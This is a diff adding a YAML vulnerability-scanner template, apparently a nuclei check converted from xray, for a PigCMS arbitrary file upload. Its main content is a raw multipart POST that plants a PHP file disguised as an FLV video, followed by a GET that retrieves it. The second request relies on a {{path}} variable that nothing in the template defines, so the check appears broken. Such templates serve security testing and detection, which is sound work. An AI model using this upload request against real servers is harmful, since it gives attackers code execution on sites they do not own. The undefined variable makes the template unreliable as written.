@@ -1,0 +1,43 @@
+id: poc-yaml-pigcms-file-upload
+
+info:
+  name: poc-yaml-pigcms-file-upload
+  author: NoHack(https://hack8.org)
+  severity: critical
+  tags: xray-converted,fileupload,ct-416592
+  reference:
+    - https://xz.aliyun.com/t/10470
+
+http:
+  - raw:
+      - |
+        POST /cms/manage/admin.php?m=manage&c=background&a=action_flashUpload HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=--------------------------835846770881083140190666
+
+        ----------------------------835846770881083140190666
+        Content-Disposition: form-data; name="filePath"; filename="{{rand_base(8)}}.php"
+        Content-Type: video/x-flv
+        
+        <?php echo "{{rand_base(8)}}"; unlink(__FILE__); ?>
+        ----------------------------835846770881083140190666--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        part: body
+        words:
+          - "MAIN_URL_ROOT/"
+  - raw:
+      - |
+        GET /cms/{{path}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
